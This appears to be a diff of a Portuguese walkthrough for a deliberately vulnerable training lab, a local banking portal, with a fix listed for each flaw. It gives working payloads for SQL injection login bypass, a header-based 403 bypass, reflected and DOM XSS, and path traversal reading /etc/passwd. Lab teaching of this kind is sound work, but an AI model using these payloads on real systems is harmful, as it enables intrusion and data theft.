@@ -2,18 +2,19 @@
 
 Este walkthrough ensina o fluxo esperado para resolver o lab **lab-01-minibank**, baseado na aplicacao **MiniBank Internal Portal**.
 
-O objetivo didatico e fazer o aluno descobrir rotas sensiveis por enumeracao logica, seguindo pistas visiveis na aplicacao, no codigo-fonte HTML e no `robots.txt`.
+O objetivo didatico e fazer o aluno descobrir rotas sensiveis por enumeracao logica, seguindo pistas visiveis na aplicacao, no codigo-fonte HTML, no `robots.txt`, no dashboard e em respostas HTTP.
 
-As quatro vulnerabilidades principais sao:
+As sete vulnerabilidades principais sao:
 
+- Credencial vazada em arquivo publico
 - SQL Injection no login
 - IDOR em contas
-- credencial vazada em arquivo publico
 - Path Traversal / LFI controlado
+- Bypass de 403 por header legado
+- XSS basico refletido
+- DOM XSS intermediario
 
-O lab tambem ensina enumeracao de usuarios por mensagens de erro diferentes no login. Essa falha nao possui flag propria.
-
-`robots.txt`, `/status`, comentario HTML, `/backup` e `/download` funcionam como pistas de enumeracao e validacao de impacto.
+O lab tambem ensina enumeracao de usuarios por mensagens diferentes no login. Essa falha nao possui flag propria.
 
 ## 1. Preparacao do ambiente
 
@@ -33,7 +34,7 @@ O esperado e iniciar:
 
 - aplicacao web em `http://localhost:8088`
 - MySQL apenas na rede interna do Docker Compose
-- somente a porta `8080` exposta no host
+- somente a porta `8088` exposta no host
 
 Valide a home:
 
@@ -52,14 +53,6 @@ curl -i http://localhost:8088
 curl -s http://localhost:8088 | head
 curl -s http://localhost:8088 | grep -i "admin\|robots\|backup\|dev\|status"
 ```
-
-O que observar:
-
-- nome da aplicacao
-- link para `/login`
-- link para `/status`
-- linguagem de portal interno legado
-- pistas no codigo-fonte HTML
 
 Teste uma rota inexistente para entender o padrao de erro:
 
@@ -83,8 +76,6 @@ Comentario esperado:
 
 Raciocinio: comentario HTML nao e controle de acesso, mas pode revelar processo interno, pendencias de publicacao e onde procurar proximas pistas.
 
-Impacto: um atacante ou auditor pode usar esse tipo de comentario para guiar enumeracao.
-
 Correcao: remover comentarios operacionais do HTML entregue ao cliente.
 
 ## 4. robots.txt
@@ -95,26 +86,16 @@ O comentario sugere verificar `robots.txt`.
 curl -i http://localhost:8088/robots.txt
 ```
 
-Conteudo esperado:
+O arquivo lista rotas que nao deveriam ser indexadas. Isso nao protege nada, mas orienta a enumeracao.
 
-```text
-User-agent: *
-Disallow: /admin
-Disallow: /backup
-Disallow: /dev.txt
-Disallow: /download
-Disallow: /status
-```
+Rotas relevantes:
 
-Raciocinio: `robots.txt` costuma listar rotas que nao deveriam ser indexadas. Isso nao protege nada, mas orienta a enumeracao.
-
-Rotas descobertas:
-
-- `/status`
-- `/dev.txt`
-- `/backup`
-- `/download`
 - `/admin`
+- `/admin/reports`
+- `/backup`
+- `/dev.txt`
+- `/download`
+- `/status`
 
 ## 5. Status verboso
 
@@ -122,12 +103,6 @@ Acesse a rota descoberta:
 
 ```bash
 curl -i http://localhost:8088/status
-```
-
-Com `jq`, se disponivel:
-
-```bash
-curl -s http://localhost:8088/status | jq
 ```
 
 O retorno revela informacoes como:
@@ -139,15 +114,73 @@ O retorno revela informacoes como:
   "version": "1.4.2-dev",
   "env": "development",
   "internal_path": "/usr/src/app",
-  "database": "mysql://minibank-db:3306/minibank"
+  "database": "mysql://minibank-db:3306/minibank",
+  "proxy_compatibility": "legacy reverse proxy compatibility mode enabled"
 }
 ```
 
-Impacto: ajuda fingerprinting, confirma ambiente de desenvolvimento, mostra path interno e indica MySQL na rede interna.
+Impacto: ajuda fingerprinting, confirma ambiente de desenvolvimento, mostra path interno e indica que existe compatibilidade legada no proxy.
 
 Correcao: endpoints publicos de status devem retornar apenas informacao minima, como `{"status":"ok"}`. Diagnosticos detalhados devem ficar restritos.
 
-## 6. Credencial vazada em arquivo publico
+## 6. Bypass de 403 por header legado
+
+O `robots.txt` revelou uma area administrativa:
+
+```bash
+curl -i http://localhost:8088/admin/reports
+```
+
+O acesso direto deve retornar `403 Forbidden` e nao deve mostrar flag.
+
+Agora use o Burp:
+
+1. Abra a rota no navegador com o Burp Proxy ativo.
+2. Envie a requisicao para o Repeater.
+3. Adicione um header de reescrita legado.
+4. Reenvie a requisicao.
+
+Headers que liberam o conteudo no lab:
+
+```http
+X-Original-URL: /admin/reports
+```
+
+ou:
+
+```http
+X-Rewrite-URL: /admin/reports
+```
+
+Com `curl`:
+
+```bash
+curl -i http://localhost:8088/admin/reports \
+  -H "X-Original-URL: /admin/reports"
+```
+
+Flag:
+
+```text
+FLAG{403_bypass_capturado}
+```
+
+Raciocinio: algumas aplicacoes ou middlewares legados confiam indevidamente em headers criados por proxies reversos. Se o backend usa esses headers para decidir qual rota foi solicitada, o cliente pode forjar o valor.
+
+Impacto:
+
+- bypass de pagina 403
+- exposicao de relatorios administrativos
+- quebra de controle de acesso por confianca em header controlado pelo cliente
+
+Correcao:
+
+- ignorar headers de reescrita vindos do cliente
+- remover compatibilidade legada quando nao for necessaria
+- validar autorizacao no backend com sessao/perfil, nao por header
+- no proxy real, sobrescrever ou remover headers sensiveis antes de encaminhar
+
+## 7. Credencial vazada em arquivo publico
 
 O `robots.txt` revelou `/dev.txt`. Acesse:
 
@@ -161,7 +194,7 @@ O arquivo contem a credencial:
 backup_user:backup123
 ```
 
-E a flag da vulnerabilidade de credencial exposta:
+E a flag:
 
 ```text
 FLAG{credencial_exposta_capturada}
@@ -174,13 +207,7 @@ curl -i http://localhost:8088/backup
 curl -i -u backup_user:backup123 http://localhost:8088/backup
 ```
 
-Sem credencial, o esperado e HTTP `401`. Com `backup_user:backup123`, o esperado e HTTP `200 OK` com listagem de relatorios.
-
-Impacto:
-
-- arquivo estatico publico vazou credencial
-- credencial permite acesso a area legada
-- notas de desenvolvimento viraram superficie de ataque
+Sem credencial, o esperado e HTTP `401`. Com `backup_user:backup123`, o esperado e HTTP `200 OK`.
 
 Correcao:
 
@@ -189,11 +216,11 @@ Correcao:
 - usar variaveis de ambiente ou secret manager
 - revisar publicacao de artefatos estaticos
 
-## 7. SQL Injection no login
+## 8. Enumeracao de usuarios e SQL Injection
 
-A rota de login usa MySQL e tambem vaza diferenca entre usuario inexistente e senha incorreta.
+A rota de login usa MySQL e vaza diferenca entre usuario inexistente e senha incorreta.
 
-Valide a enumeracao de usuario inexistente:
+Valide usuario inexistente:
 
 ```bash
 curl -i -X POST http://localhost:8088/login \
@@ -207,7 +234,7 @@ Mensagem esperada:
 Usuario nao encontrado.
 ```
 
-Agora valide usuario existente com senha incorreta:
+Valide usuario existente com senha incorreta:
 
 ```bash
 curl -i -X POST http://localhost:8088/login \
@@ -221,65 +248,20 @@ Mensagem esperada:
 Senha invalida.
 ```
 
-Raciocinio: mensagens diferentes permitem descobrir quais usuarios existem antes de tentar outras tecnicas de autenticacao.
+Isso permite enumerar usuarios validos. No lab, essa enumeracao e intencional e nao possui flag propria.
 
-Impacto: um atacante pode reduzir tentativa e erro, montar lista de usuarios validos e combinar isso com senha fraca, phishing ou outros bugs.
-
-No lab, essa enumeracao e intencional. Em sistemas reais, a correcao e retornar uma mensagem uniforme para falhas de login.
-
-Depois valide comportamento normal:
-
-```bash
-curl -i -c joao.cookies \
-  -d "username=joao&password=joao123" \
-  http://localhost:8088/login
-```
-
-Confirme o dashboard:
-
-```bash
-curl -s -b joao.cookies http://localhost:8088/dashboard | grep -i "joao\|employee\|contas"
-```
-
-Agora valide falha de login:
-
-```bash
-curl -i \
-  -d "username=admin&password=senha_errada" \
-  http://localhost:8088/login
-```
-
-Como `admin` existe, a mensagem esperada e:
-
-```text
-Senha invalida.
-```
-
-O ponto vulneravel e a concatenacao direta de `username` e `password` na query SQL.
+O ponto vulneravel principal e a concatenacao direta de `username` e `password` na query SQL.
 
 Payload funcional:
 
 ```text
-username: admin' OR '1'='1' -- 
+username: admin' OR '1'='1' -- -
 password: qualquercoisa
 ```
 
-Inclua o espaco apos `--`; no MySQL ele faz parte do comentario SQL.
+Inclua um espaco apos `--`; no MySQL ele faz parte do comentario SQL. O `-` final acima existe apenas para deixar o espaco visivel no payload.
 
-Com `curl`:
-
-```bash
-curl -i -c admin.cookies \
-  --data-urlencode "username=admin' OR '1'='1' -- " \
-  --data-urlencode "password=qualquercoisa" \
-  http://localhost:8088/login
-```
-
-Valide a flag no dashboard:
-
-```bash
-curl -s -b admin.cookies http://localhost:8088/dashboard | grep -i "FLAG"
-```
+Ao enviar o formulario, a aplicacao deve redirecionar para `/dashboard` como usuario admin.
 
 Flag:
 
@@ -287,39 +269,34 @@ Flag:
 FLAG{sqli_capturada}
 ```
 
-Impacto: bypass de autenticacao e acesso como usuario administrativo sem conhecer a senha.
-
 Correcao:
 
 - prepared statements
 - queries parametrizadas
 - hash forte de senha
-- validacao de entrada
 - respostas de erro uniformes
 
-## 8. IDOR em contas
+## 9. IDOR em contas
 
-IDOR ocorre quando a aplicacao usa um ID direto na URL e nao valida se o usuario logado pode acessar aquele recurso.
+Faca login como usuario comum:
 
-Faca login como Joao:
-
-```bash
-curl -i -c joao.cookies \
-  -d "username=joao&password=joao123" \
-  http://localhost:8088/login
+```text
+joao / joao123
 ```
 
 Acesse uma conta do Joao:
 
-```bash
-curl -s -b joao.cookies http://localhost:8088/account/1 | grep -i "Joao\|Conta\|Nota"
+```text
+http://localhost:8088/account/1
 ```
 
 Troque apenas o ID para a conta de Maria:
 
-```bash
-curl -s -b joao.cookies http://localhost:8088/account/2 | grep -i "Maria\|FLAG\|Nota"
+```text
+http://localhost:8088/account/2
 ```
+
+A aplicacao exige autenticacao, mas nao valida se a conta pertence ao usuario logado.
 
 Flag:
 
@@ -327,21 +304,101 @@ Flag:
 FLAG{idor_capturada}
 ```
 
-Raciocinio: a aplicacao exige autenticacao, mas nao valida autorizacao sobre o recurso. Login e permissao de acesso nao sao a mesma coisa.
-
-Impacto:
-
-- acesso a dados de outro cliente/usuario
-- vazamento de saldo, numero de conta e notas internas
-- quebra de autorizacao horizontal
-
 Correcao:
 
 - validar dono do recurso no backend
 - filtrar por `id` e `user_id`
 - testar acesso cruzado entre usuarios
 
-## 9. Path Traversal / LFI controlado
+## 10. XSS basico refletido
+
+Depois de entrar no dashboard, observe o link **Busca de clientes**. A rota tambem pode ser acessada diretamente:
+
+```text
+http://localhost:8088/search
+```
+
+Teste uma busca comum:
+
+```text
+http://localhost:8088/search?q=teste
+```
+
+O valor de `q` volta no HTML da resposta. Agora teste um payload simples de script:
+
+```html
+<script>alert(1)</script>
+```
+
+URL codificada para teste rapido:
+
+```bash
+curl -i "http://localhost:8088/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+```
+
+No navegador, o JavaScript deve executar porque a aplicacao reflete a entrada sem sanitizacao.
+
+Flag:
+
+```text
+FLAG{xss_basico_capturado}
+```
+
+Raciocinio: XSS refletido ocorre quando a entrada do usuario via request HTTP volta na resposta HTML sem escape seguro.
+
+Impacto:
+
+- execucao de JavaScript no navegador da vitima
+- roubo de dados acessiveis ao DOM
+- phishing ou alteracao visual da pagina
+
+Correcao:
+
+- escapar output HTML
+- usar templates com escape automatico
+- validar e normalizar entrada
+- aplicar Content Security Policy como defesa adicional
+
+## 11. DOM XSS intermediario
+
+No dashboard, observe o link **Ferramentas do cliente**:
+
+```text
+http://localhost:8088/client-tools
+```
+
+Essa pagina contem JavaScript client-side que le `window.location.hash`, extrai o parametro `msg` e insere o valor no DOM usando `innerHTML`.
+
+Teste uma mensagem simples:
+
+```text
+http://localhost:8088/client-tools#msg=teste
+```
+
+Agora teste um payload em atributo HTML:
+
+```text
+http://localhost:8088/client-tools#msg=<img src=x onerror=alert(1)>
+```
+
+No DOM XSS, o payload nao aparece em logs HTTP nem chega ao servidor, porque o fragmento `#...` e processado somente pelo navegador.
+
+Flag:
+
+```text
+FLAG{dom_xss_capturado}
+```
+
+Raciocinio: DOM XSS acontece quando JavaScript da pagina pega uma fonte controlada pelo usuario, como `location.hash`, e escreve em um sink perigoso, como `innerHTML`.
+
+Correcao:
+
+- usar `textContent` em vez de `innerHTML`
+- sanitizar HTML quando HTML for realmente necessario
+- evitar usar fragmentos de URL como HTML
+- revisar sinks perigosos no frontend
+
+## 12. Path Traversal / LFI controlado
 
 O `robots.txt` revelou `/download`. Teste primeiro um arquivo esperado:
 
@@ -349,36 +406,32 @@ O `robots.txt` revelou `/download`. Teste primeiro um arquivo esperado:
 curl -i "http://localhost:8088/download?file=public-info.txt"
 ```
 
-Esse teste prova a funcionalidade normal do downloader legado.
-
-Como `/backup` lista relatorios disponiveis, leia tambem o relatorio de Q2 pelo downloader:
+Leia tambem o relatorio de Q2:
 
 ```bash
 curl -i "http://localhost:8088/download?file=report-q2.txt"
 ```
 
-Observe a pista operacional:
+Pista relevante:
 
 ```text
 Durante a migracao, a configuracao antiga foi movida para o diretorio config.
 Arquivo revisado pela equipe: legacy.conf
 ```
 
-Depois prove a leitura fora do diretorio permitido lendo um arquivo conhecido do sistema:
+Prove a leitura fora do diretorio permitido lendo um arquivo conhecido do sistema:
 
 ```bash
 curl -i "http://localhost:8088/download?file=../../../../etc/passwd"
 ```
 
-O retorno deve conter linhas tipicas como `root:x:0:0:root`.
-
-Volte ao vazamento de `/status` e observe o caminho interno:
+Volte ao vazamento de `/status` e observe:
 
 ```json
 "internal_path": "/usr/src/app"
 ```
 
-Como o downloader parte de `/usr/src/app/files`, a pista `config` + `legacy.conf` aponta para um arquivo legado dentro da aplicacao, acessivel voltando um diretorio:
+Como o downloader parte de `/usr/src/app/files`, a pista `config` + `legacy.conf` aponta para um arquivo legado acessivel voltando um diretorio:
 
 ```bash
 curl -i "http://localhost:8088/download?file=../config/legacy.conf"
@@ -389,15 +442,6 @@ Flag:
 ```text
 FLAG{path_traversal_capturada}
 ```
-
-Raciocinio: o endpoint aceita um nome de arquivo e monta um caminho no servidor sem garantir que o caminho final continua dentro da pasta permitida.
-
-Impacto:
-
-- leitura de arquivo fora do diretorio esperado
-- vazamento de segredos
-- exposicao de configuracoes internas no container
-- descoberta de caminhos reais a partir de endpoints verbosos como `/status`
 
 Correcao:
 
@@ -406,23 +450,26 @@ Correcao:
 - bloquear `../`
 - garantir que o caminho final permanece dentro do diretorio permitido
 
-## 10. Fluxo esperado do aluno
+## 13. Fluxo esperado do aluno
 
 1. Acessar a home
 2. Visualizar o codigo-fonte
 3. Encontrar comentario HTML sugerindo `robots.txt`
 4. Acessar `/robots.txt`
-5. Descobrir `/status`, `/dev.txt`, `/backup` e `/download`
-6. Acessar `/dev.txt` e encontrar credencial exposta
-7. Usar credencial no `/backup`
-8. Enumerar usuarios por mensagens diferentes no login
-9. Explorar login com SQL Injection
-10. Acessar contas e explorar IDOR
-11. Ler `report-q2.txt` e identificar a pista `config` + `legacy.conf`
-12. Provar Path Traversal com `/etc/passwd`
-13. Usar `internal_path=/usr/src/app` para ler `../config/legacy.conf`
+5. Descobrir `/status`, `/dev.txt`, `/backup`, `/download`, `/admin` e `/admin/reports`
+6. Usar `/status` para entender o ambiente e a pista de proxy legado
+7. Testar `/admin/reports`, receber 403 e validar bypass no Burp Repeater com header legado
+8. Acessar `/dev.txt` e encontrar credencial exposta
+9. Usar credencial no `/backup`
+10. Enumerar usuarios por mensagens diferentes no login
+11. Explorar login com SQL Injection
+12. Acessar contas e explorar IDOR
+13. Usar links do dashboard para testar XSS refletido e DOM XSS
+14. Ler `report-q2.txt` e identificar a pista `config` + `legacy.conf`
+15. Provar Path Traversal com `/etc/passwd`
+16. Usar `internal_path=/usr/src/app` para ler `../config/legacy.conf`
 
-## 11. Validacao rapida
+## 14. Validacao rapida
 
 Com a aplicacao em execucao:
 
@@ -430,22 +477,32 @@ Com a aplicacao em execucao:
 curl -i http://localhost:8088
 curl -i http://localhost:8088/status
 curl -i http://localhost:8088/robots.txt
+curl -i http://localhost:8088/admin/reports
+curl -i http://localhost:8088/admin/reports -H "X-Original-URL: /admin/reports"
 curl -i http://localhost:8088/dev.txt
-curl -i -X POST http://localhost:8088/login -d "username=naoexiste" -d "password=teste"
-curl -i -X POST http://localhost:8088/login -d "username=joao" -d "password=errada"
+curl -i -X POST http://127.0.0.1:8088/login -d "username=naoexiste" -d "password=teste"
+curl -i -X POST http://127.0.0.1:8088/login -d "username=joao" -d "password=errada"
+curl -i "http://127.0.0.1:8088/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
 curl -i "http://localhost:8088/download?file=public-info.txt"
 curl -i "http://localhost:8088/download?file=report-q2.txt"
 curl -i "http://localhost:8088/download?file=../../../../etc/passwd"
 curl -i "http://localhost:8088/download?file=../config/legacy.conf"
 ```
 
-Valide as flags no repositorio usando o comando documentado em `../VALIDATION.md`.
+Valide o DOM XSS no navegador:
+
+```text
+http://127.0.0.1:8088/client-tools#msg=<img src=x onerror=alert(1)>
+```
 
 Resultado esperado:
 
 ```text
+FLAG{403_bypass_capturado}
 FLAG{credencial_exposta_capturada}
-FLAG{idor_capturada}
-FLAG{path_traversal_capturada}
 FLAG{sqli_capturada}
+FLAG{idor_capturada}
+FLAG{xss_basico_capturado}
+FLAG{dom_xss_capturado}
+FLAG{path_traversal_capturada}
 ```
